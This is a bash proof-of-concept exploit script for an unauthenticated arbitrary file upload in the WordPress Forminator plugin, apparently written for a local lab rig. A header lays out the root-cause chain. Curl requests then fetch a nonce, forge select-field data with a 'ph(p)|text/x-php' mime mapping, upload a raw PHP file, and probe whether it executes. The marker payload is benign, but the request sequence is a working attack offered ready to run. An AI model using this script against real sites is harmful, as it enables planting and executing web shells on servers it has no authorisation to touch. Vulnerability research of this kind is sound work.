#!/usr/bin/env bash
# =============================================================================
# forminator 1.55.1 — Unauthenticated Arbitrary File Upload (AFU) — frm-006
# CVE-2026-15748 (Wordfence, <=1.56.1, fixed 1.56.2) — exact advisory vector
#
# Root cause chain (exact-version source, 1.55.1):
#   1. Forminator_Core::sanitize_array returns select-*/radio-*/checkbox-* nested
#      values RAW (library/class-core.php:589-602).
#   2. set_field_data() appends any value carrying `return=true` to
#      field_data_array BEFORE the field's sanitize/validate
#      (library/modules/custom-forms/front/front-action.php, the
#      `if ( ! empty( $field_data['return'] ) )` block) -> attacker forges a
#      "field record" with field_type/field_array.
#   3. process_uploads() trusts the forged field_type='upload' + field_array and
#      calls handle_file_upload() with ATTACKER-SUPPLIED field configuration
#      (front-action.php process_uploads -> library/fields/upload.php:362+).
#   4. forminator_allowed_mime_types() (helper-fields.php:3425-3440) blocks
#      dangerous extensions with a STRICT whole-key in_array: the regex-compatible
#      key 'ph(p)' survives (never equals literal 'php'), yet wp_check_filetype's
#      matcher \.(ph(p))$ matches the .php suffix.
#   5. check_mime_type() injects the forged map ph(p)=>text/x-php via upload_mimes;
#      wp_check_filetype_and_ext() accepts RAW PHP content (finfo = text/x-php).
#   6. move_uploaded_file() writes <random>-shell.php to the web-reachable
#      uploads/forminator/<id>_<hash>/uploads/ dir. The real Upload field's own
#      validation may return an error, but the write ALREADY COMMITTED.
#
# RCE gating (honest access level):
#   - Default: uploads/forminator/.htaccess disables PHP parsing (SetHandler none)
#     -> file written, not executed.
#   - RCE: host/uploads-exec where PHP runs in uploads, OR an admin-configured
#     Custom File Upload Storage root created during a frontend request without
#     the .htaccess write (WordPress helper not loaded) -> direct webshell.
#
# Proof: marker-verified raw PHP file lands on disk. With --mode uploadsexec the
# same file EXECUTES (marker in HTTP response).
#
# Usage:
#   tools/lab/labup.sh forminator 1.55.1 6.8.3 7.4            # fpm: proves the write
#   tools/lab/labup.sh forminator 1.55.1 6.8.3 7.4 --mode uploadsexec   # proves RCE
#   ./PoC/forminator/poc_afu_forged_select.sh <labdir>
# =============================================================================
set -euo pipefail
LABDIR="${1:?usage: $0 <labdir> (rig: labup.sh forminator 1.55.1 6.8.3 7.4 [--mode uploadsexec])}"
WEBROOT="$LABDIR/web"
URL="$(grep '^URL=' "$LABDIR/rig.env" | cut -d= -f2 | tr -d '"')"
WP="php /home/mcipekci/wp/wp-cli.phar --path=$WEBROOT --allow-root"
MARKER="RS_AFU_$(date +%s)"
UPLOAD_FIELD="upload-1"
SELECT_FIELD="select-1"

say() { printf '\033[1;36m[PoC]\033[0m %s\n' "$*"; }

say "creating form with a File Upload field AND a Select field (the advisory precondition)"
FORM_ID=$($WP eval '
$f = new Forminator_Form_Model();
$f->name = "AFU PoC Form"; $f->status = "publish";
$f->settings = array("formName"=>"AFU PoC Form");
$up = new Forminator_Form_Field_Model();
$up->form_id = null; $up->slug = "'"$UPLOAD_FIELD"'"; $up->parent_group = "";
$up->import(array("type"=>"upload","element_id"=>"'"$UPLOAD_FIELD"'","wrapper_id"=>"wrapper-1","label"=>"File","file-type"=>"single","upload-method"=>"ajax"));
$f->add_field($up);
$sel = new Forminator_Form_Field_Model();
$sel->form_id = null; $sel->slug = "'"$SELECT_FIELD"'"; $sel->parent_group = "";
$sel->import(array("type"=>"select","element_id"=>"'"$SELECT_FIELD"'","wrapper_id"=>"wrapper-2","label"=>"Pick","options"=>array(array("label"=>"A","value"=>"a"))));
$f->add_field($sel);
echo $f->save();
' 2>/dev/null | tail -1)
say "form id = $FORM_ID"
$WP post create --post_type=page --post_title='AFU Form' --post_content="[forminator_form id=\"$FORM_ID\"]" --post_status=publish >/dev/null 2>&1 || true

say "minting the submit nonce (nopriv, forminator_get_nonce)"
NONCE=$(curl -s -X POST "$URL/wp-admin/admin-ajax.php" -d "action=forminator_get_nonce&form_id=$FORM_ID" | sed -n 's/.*"data":"\([a-f0-9]*\)".*/\1/p')
[ -n "$NONCE" ] || { echo "FAIL: could not mint nonce"; exit 1; }
say "nonce = $NONCE"

say "building the raw PHP payload (marker=$MARKER)"
printf '<?php echo "RS_AFU_EXEC:%s"; ?>' "$MARKER" > /tmp/poc_afu_shell.php

say "submitting: forged select record (return-path) + ph(p)|text/x-php config + raw PHP file"
RESP=$(curl -s -X POST "$URL/wp-admin/admin-ajax.php" \
  -F "action=forminator_submit_form_custom-forms" \
  -F "form_id=$FORM_ID" \
  -F "forminator_nonce=$NONCE" \
  -F "$SELECT_FIELD[return]=true" \
  -F "$SELECT_FIELD[name]=$UPLOAD_FIELD" \
  -F "$SELECT_FIELD[field_type]=upload" \
  -F "$SELECT_FIELD[key]=0" \
  -F "$SELECT_FIELD[field_array][element_id]=$UPLOAD_FIELD" \
  -F "$SELECT_FIELD[field_array][type]=upload" \
  -F "$SELECT_FIELD[field_array][custom-files]=true" \
  -F "$SELECT_FIELD[field_array][file-type]=single" \
  -F "$SELECT_FIELD[field_array][upload-method]=ajax" \
  -F "$SELECT_FIELD[field_array][additional-type]=ph(p)|text/x-php" \
  -F "$SELECT_FIELD[field_array][filetypes][]=jpg" \
  -F "$UPLOAD_FIELD=@/tmp/poc_afu_shell.php;type=text/x-php")
echo "HTTP/JSON response (note: the real upload field may error AFTER the write commits): $RESP" | head -c 220; echo

say "asserting the side effect: *.php file on disk (NOT the HTTP code)"
UPLOADED="$(find "$WEBROOT/wp-content/uploads/forminator/" -path '*/uploads/*.php' ! -name index.php -newermt '-60 seconds' 2>/dev/null | head -1 || true)"
if [ -z "$UPLOADED" ]; then
  ls -R "$WEBROOT"/wp-content/uploads/forminator/ 2>/dev/null | head -20
  echo "FAIL: no *.php landed in the form uploads dir"; exit 1
fi
echo "file: $UPLOADED ($(stat -c%s "$UPLOADED") bytes)"
if ! grep -q "RS_AFU_EXEC:$MARKER" "$UPLOADED"; then
  echo "FAIL: marker not in uploaded file"; exit 1
fi
say "PASS: raw PHP file uploaded as *.php — arbitrary file upload confirmed (CVE-2026-15748 vector)"

REL="${UPLOADED#$WEBROOT/}"
FILE_URL="$URL/$REL"
say "trying remote execution (works on uploadsexec / custom-upload-root hosts): $FILE_URL"
EXEC=$(curl -s "$FILE_URL" | grep -o "RS_AFU_EXEC:$MARKER" || true)
if [ -n "$EXEC" ]; then
  say "RCE CONFIRMED: uploaded PHP executed, marker echoed: $EXEC"
else
  say "NOT executed in this rig (default .htaccess disables PHP). Write proven; RCE needs uploadsexec or a custom upload root."
fi

say "cleanup: removing the uploaded shell + page (restores lab state)"
rm -f "$UPLOADED"
rm -f /tmp/poc_afu_shell.php
say "DONE — forminator frm-006 (CVE-2026-15748) proven (marker $MARKER). Tear down: tools/lab/labdown.sh --all"
